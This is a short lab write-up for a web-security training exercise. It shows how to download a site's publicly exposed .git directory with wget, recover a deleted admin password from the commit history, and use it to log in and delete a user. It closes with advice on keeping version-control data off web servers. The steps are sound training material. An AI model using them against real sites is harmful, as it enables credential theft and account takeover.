# Lab 07 — Information disclosure in version control history

> **Expert** · [Official lab](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history)

**Entry point:** the site's `.git` directory is web-accessible.

## Solution

1. `GET /.git/HEAD` → readable: the whole `.git` directory is exposed.
2. Mirror it locally:

```bash
wget -r https://YOUR-LAB-ID.web-security-academy.net/.git/
cd YOUR-LAB-ID.web-security-academy.net
git status        # shows deleted files
git log           # commit history
```

3. `git log` shows a commit like *"Remove admin password from source code"*.
   Recover the deleted content:

```bash
git diff HEAD commit-hash    # or: git checkout <hash> -- admin.php
```

The diff reveals the admin password that was removed.
4. Log in as `administrator`, delete `carlos` — lab solved.

## Mitigation

Never deploy `.git` (or any VCS metadata) to web roots; scrub secrets from
history before publishing anything.
